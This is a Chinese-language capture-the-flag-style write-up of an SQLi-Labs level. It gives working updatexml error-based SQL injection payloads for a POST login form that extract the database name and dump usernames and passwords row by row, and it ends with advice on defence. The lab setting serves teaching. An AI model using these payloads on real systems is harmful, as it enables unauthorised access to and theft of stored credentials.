## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：在无回显的 POST 登录框中，识别出单引号+括号 `')` 的闭合方式，利用 updatexml 报错注入带出数据。

## 二、大白话原理讲解
这一关是第 12 关（POST 变形）和第 5 关（报错注入）的结合体。
提款机的锁孔变成了**单引号+小括号 `')`**，而且后台柜员（数据库）还变成了“哑巴”，不给你看任何查出来的数据，只告诉你“登录失败”。

既然他不给看数据，我们就故技重施，利用 `updatexml()` 函数去“碰瓷”让他报错。只要他报错，错误信息里就会夹带我们想要的私货（账号密码）。

## 三、解题步骤

**1. 抓包与测闭合**
用 HackBar 或 Burp 抓取登录请求，修改 `uname` 参数为 `admin'`。
页面报错：`right syntax to use near '123') LIMIT 0,1'`。
**分析**：观察报错，发现 `')`，说明后台 SQL 语句类似 `username=('$uname') AND password=('$passwd')`。闭合符为 `')`。

**2. 尝试报错注入（爆库）**
在 `uname` 参数中构造 `updatexml` 进行测试：
```text
uname=-1') and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=123&submit=Submit
```
**现象**：页面报错 `XPATH syntax error: '~security~'`。成功爆出数据库名。

**3. 终极拖库（拿账号密码）**
由于报错长度限制（32个字符），利用 `limit` 逐行读取数据：
```text
uname=-1') and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+&passwd=123&submit=Submit
```
**结果**：页面报错 `XPATH syntax error: '~Dumb:Dumb~'`，成功获取第一行用户的账号密码。通关。

*(如果想查其他用户，只需修改 limit 0,1 为 limit 1,1、limit 2,1 即可)*

## 四、知识点解析
1. **POST 报错注入**：虽然数据通过 POST 提交，但 `updatexml` 等函数触发 XPath 语法错误的原理不变，错误信息依然会回显在页面。
2. **参数拼接**：在 POST 注入中，要特别关注其他参数（如 `passwd=123&submit=Submit`）是否完整传递，确保闭合和注释符 `--+` 能正确生效。
3. **limit 的运用**：在长报错回显受限时，`limit` 是一次性只读一条数据的核心。

## 五、总结与防御
**本题总结**：
在登录框场景下，如果遇到无回显，优先尝试报错注入。找到精确的闭合符 `')` 后，利用 `updatexml` 强行让数据库报错，即可实现数据提取。

**安全防御建议**：
- **关闭详细报错**：生产环境必须关闭详细报错信息，防止攻击者利用报错内容套取数据。
- **预编译语句（PDO/MySQLi）**：彻底隔离代码与数据，杜绝注入。
